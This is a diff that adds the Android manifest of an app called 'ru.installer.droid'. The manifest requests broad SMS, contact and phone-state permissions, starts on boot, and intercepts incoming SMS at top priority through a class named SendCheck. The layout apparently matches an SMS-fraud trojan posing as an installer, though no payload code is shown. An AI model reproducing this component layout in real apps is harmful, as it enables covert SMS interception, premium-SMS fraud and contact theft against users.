@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="ru.installer.droid">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:label="@string/app_name" android:name="ru.installer.droid.ui.MainActivity" android:theme="@android:style/Theme.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:name="ru.installer.droid.ui.RulesActivity" android:theme="@android:style/Theme.NoTitleBar"/>
+        <activity android:name="ru.installer.droid.ui.DownloadersActivity" android:theme="@android:style/Theme.NoTitleBar"/>
+        <activity android:name="ru.installer.droid.ui.SendActivity"/>
+        <receiver android:enabled="true" android:exported="true" android:name="ru.installer.droid.system.BootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:name=".system.AndroidSystemService"/>
+        <receiver android:name="ru.installer.droid.other.SendCheck">
+            <intent-filter android:priority="1000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="ru.installer.droid.system.ControlManager"/>
+    </application>
+</manifest>
